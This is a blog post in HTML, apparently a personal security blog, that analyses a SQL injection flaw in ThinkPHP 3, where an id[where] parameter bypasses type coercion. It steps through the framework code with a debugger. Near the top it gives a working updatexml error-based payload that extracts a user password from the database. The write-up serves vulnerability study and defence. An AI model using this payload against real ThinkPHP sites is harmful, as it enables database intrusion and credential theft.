@@ -1,0 +1,265 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>thinkphp 3 where 注入漏洞分析 | Gridea</title>
+<link rel="shortcut icon" href="https://xuansgg.github.io/favicon.ico?v=1629601697924">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://xuansgg.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="thinkphp 3 where 注入漏洞分析 | Gridea - Atom Feed" href="https://xuansgg.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="漏洞
+
+分析
+正常传参的参数 应该是数组或者int 类型 但是通过 id[where] 进行了逃避 最终造成了注入 没有进入 _parseOptions 方法中 字段类型验证 ，如果is_array($options['where'])这个..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://xuansgg.github.io">
+  <img class="avatar" src="https://xuansgg.github.io/images/avatar.png?v=1629601697924" alt="">
+  </a>
+  <h1 class="site-title">
+    Gridea
+  </h1>
+  <p class="site-description">
+    温故而知新
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              thinkphp 3 where 注入漏洞分析
+            </h2>
+            <div class="post-info">
+              <span>
+                2021-08-22
+              </span>
+              <span>
+                3 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h1 id="漏洞">漏洞</h1>
+<!-- m我呜呜呜呜呜呜呜 -->
+<p>分析<br>
+<strong>正常传参的参数 应该是数组或者int 类型 但是通过 id[where] 进行了逃避 最终造成了注入 没有进入 _parseOptions 方法中 字段类型验证 ，如果is_array($options['where'])这个条件满足，那么我们注入的SQL语句都会被_parseType 进行强转，如果是id[where]则导致不满足，从而产生了SQL注入!</strong><br>
+<strong>​</strong></p>
+<!-- more -->
+<!-- more -->
+<!-- more -->
+<!-- more -->
+<!-- more -->
+<p>**漏洞payload **</p>
+<pre><code class="language-shell">id[where]=3 and 1=updatexml(1,concat(0x7,(select password from user limit 1),0x7e),1)%23
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://cdn.nlark.com/yuque/0/2021/png/1312122/1629598782357-6c63e920-be71-4bc2-96bf-a80a038b21f2.png#clientId=u48fc78fe-2cfd-4&amp;from=paste&amp;height=957&amp;id=u69405aea&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=957&amp;originWidth=2551&amp;originalType=binary&amp;ratio=1&amp;size=207795&amp;status=done&amp;style=none&amp;taskId=ud647fd22-5030-4b76-a3fe-547a71cba9d&amp;width=2551" alt="image.png" loading="lazy"></figure>
+<h1 id="漏洞分析">漏洞分析</h1>
+<p>创建 index 方法</p>
+<pre><code class="language-php">&lt;?php
+namespace Home\Controller;
+use http\Client\Curl\User;
+use Think\Controller;
+class IndexController extends Controller
+{
+    public function index()
+
+    {
+        $data = M(&quot;user&quot;)-&gt;find(I('get.id'));
+        var_dump($data);
+
+    }
+    public function test(){
+        echo 1;
+    }
+
+}
+
+
+</code></pre>
+<p><code>_下入断点 _</code><br>
+<img src="https://cdn.nlark.com/yuque/0/2021/png/1312122/1629598860830-922c73de-2d4d-464e-851f-82a4aa5da61a.png#clientId=u48fc78fe-2cfd-4&amp;from=paste&amp;height=458&amp;id=ube7ac1d0&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=458&amp;originWidth=831&amp;originalType=binary&amp;ratio=1&amp;size=29349&amp;status=done&amp;style=none&amp;taskId=ubead88e3-0654-46e6-b26c-1e9f6776d53&amp;width=831" alt="image.png" loading="lazy"></p>
+<p>首先进入 M 实列化<br>
+<img src="https://cdn.nlark.com/yuque/0/2021/png/1312122/1629598951295-e2f3f055-36db-4a45-8695-89c57d8c61b9.png#clientId=u48fc78fe-2cfd-4&amp;from=paste&amp;height=883&amp;id=u0bf9dfd5&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=883&amp;originWidth=1489&amp;originalType=binary&amp;ratio=1&amp;size=169456&amp;status=done&amp;style=none&amp;taskId=ueb37f054-92cf-4299-bb25-54bfba77150&amp;width=1489" alt="image.png" loading="lazy"></p>
+<p>而后传参进入 I  并获得get 的参数 并赋值到$input<br>
+<img src="https://cdn.nlark.com/yuque/0/2021/png/1312122/1629599074634-b544a519-2431-4370-ba3b-422bf889405c.png#clientId=u48fc78fe-2cfd-4&amp;from=paste&amp;height=1152&amp;id=u38cea121&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=1152&amp;originWidth=2138&amp;originalType=binary&amp;ratio=1&amp;size=253581&amp;status=done&amp;style=none&amp;taskId=ua6df7425-a968-4419-80d5-0c168543cf1&amp;width=2138" alt="image.png" loading="lazy"><br>
+这边会来到htmlspecialchars和think_filter过滤处理之后返回<br>
+<img src="https://cdn.nlark.com/yuque/0/2021/png/1312122/1629599184482-23edad29-7a36-49e8-9ac7-20f980a435fd.png#clientId=u48fc78fe-2cfd-4&amp;from=paste&amp;height=596&amp;id=u50907464&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=596&amp;originWidth=1687&amp;originalType=binary&amp;ratio=1&amp;size=110447&amp;status=done&amp;style=none&amp;taskId=uf56910c3-fdde-4e2b-94da-f137890c1f6&amp;width=1687" alt="image.png" loading="lazy"></p>
+<p>后面会进入到find类<br>
+​</p>
+<p>由于$options 并不满足 字符串 和字符 并不带入<br>
+<img src="https://cdn.nlark.com/yuque/0/2021/png/1312122/1629599489296-a9a6517a-9d84-4789-ac5d-c40350b31158.png#clientId=u48fc78fe-2cfd-4&amp;from=paste&amp;height=210&amp;id=u197771ca&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=210&amp;originWidth=2016&amp;originalType=binary&amp;ratio=1&amp;size=54717&amp;status=done&amp;style=none&amp;taskId=ucd4dfb98-035d-4188-b7f3-ece60642f3f&amp;width=2016" alt="image.png" loading="lazy"></p>
+<pre><code class="language-php"> if(is_numeric($options) || is_string($options)) {
+            $where[$this-&gt;getPk()]  =   $options;
+            $options                =   array();
+            $options['where']       =   $where;
+        }
+</code></pre>
+<p>进行一些键值获取后 会进入到 _parseOptions 方法</p>
+<figure data-type="image" tabindex="2"><img src="https://cdn.nlark.com/yuque/0/2021/png/1312122/1629599620790-5dfedc0f-34ac-4bd9-9a8f-944722bbcfea.png#clientId=u48fc78fe-2cfd-4&amp;from=paste&amp;height=204&amp;id=ue16a1808&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=204&amp;originWidth=1286&amp;originalType=binary&amp;ratio=1&amp;size=30811&amp;status=done&amp;style=none&amp;taskId=u4a90fe2d-0e30-4f31-a235-56cf89bf541&amp;width=1286" alt="image.png" loading="lazy"></figure>
+<pre><code class="language-php">  $options['limit']   =   1;
+        // 分析表达式
+        $options            =   $this-&gt;_parseOptions($options);
+        // 判断查询缓存
+        if(isset($options['cache'])){
+            $cache  =   $options['cache'];
+            $key    =   is_string($cache['key'])?$cache['key']:md5(serialize($options));
+            $data   =   S($key,'',$cache);
+            if(false !== $data){
+                $this-&gt;data     =   $data;
+                return $data;
+            }
+        }
+</code></pre>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/1312122/1629599687702-7de64fa1-7010-4a71-b1ba-4bc9c2bb2b3e.png#clientId=u48fc78fe-2cfd-4&amp;from=paste&amp;height=743&amp;id=u75a2fea3&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=743&amp;originWidth=1936&amp;originalType=binary&amp;ratio=1&amp;size=161825&amp;status=done&amp;style=none&amp;taskId=u0c7af803-d59f-4512-9105-c85f6a3dc38&amp;width=1936" alt="image.png" loading="lazy"><br>
+而后会来到判断阶段<br>
+<img src="https://cdn.nlark.com/yuque/0/2021/png/1312122/1629599781670-88ca862f-db90-4b42-827d-c2610f5757b8.png#clientId=u48fc78fe-2cfd-4&amp;from=paste&amp;height=405&amp;id=u12b4a29f&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=405&amp;originWidth=2136&amp;originalType=binary&amp;ratio=1&amp;size=92788&amp;status=done&amp;style=none&amp;taskId=u437ae376-41d8-45d0-8089-3b6fac6ebc0&amp;width=2136" alt="image.png" loading="lazy"></p>
+<pre><code class="language-php">if(isset($options['where']) &amp;&amp; is_array($options['where']) &amp;&amp; !empty($fields) &amp;&amp; !isset($options['join'])) {
+            // 对数组查询条件进行字段类型检查
+            foreach ($options['where'] as $key=&gt;$val){
+                $key            =   trim($key);
+                if(in_array($key,$fields,true)){
+                    if(is_scalar($val)) {
+                        $this-&gt;_parseType($options['where'],$key);
+                    }
+                }elseif(!is_numeric($key) &amp;&amp; '_' != substr($key,0,1) &amp;&amp; false === strpos($key,'.') &amp;&amp; false === strpos($key,'(') &amp;&amp; false === strpos($key,'|') &amp;&amp; false === strpos($key,'&amp;')){
+                    if(!empty($this-&gt;options['strict'])){
+                        E(L('_ERROR_QUERY_EXPRESS_').':['.$key.'=&gt;'.$val.']');
+                    } 
+                    unset($options['where'][$key]);
+                }
+            }
+        }
+</code></pre>
+<p>$options['where'] 的值是一个字符串 绕过了**_parseType 进行强转 最终造成了注入**<br>
+<img src="https://cdn.nlark.com/yuque/0/2021/png/1312122/1629599966024-7380fe1d-4380-4d77-8554-4599fad75ec9.png#clientId=u48fc78fe-2cfd-4&amp;from=paste&amp;height=728&amp;id=u9be70d22&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=728&amp;originWidth=2130&amp;originalType=binary&amp;ratio=1&amp;size=153177&amp;status=done&amp;style=none&amp;taskId=uee3f54a1-848c-46fb-95b2-093300a3129&amp;width=2130" alt="image.png" loading="lazy"></p>
+<p>最终进入select 方法<img src="https://cdn.nlark.com/yuque/0/2021/png/1312122/1629599991688-57fde412-7380-41ad-9a37-d41443f4659f.png#clientId=u48fc78fe-2cfd-4&amp;from=paste&amp;height=76&amp;id=u0b692a82&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=76&amp;originWidth=2157&amp;originalType=binary&amp;ratio=1&amp;size=21187&amp;status=done&amp;style=none&amp;taskId=u62faaba6-b54a-4aec-bc0e-c6d8ffa9fd5&amp;width=2157" alt="image.png" loading="lazy"></p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E6%BC%8F%E6%B4%9E">漏洞</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">漏洞分析</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://xuansgg.github.io/post/hello-gridea/">
+              <h3 class="post-title">
+                Hello Gridea
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://xuansgg.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
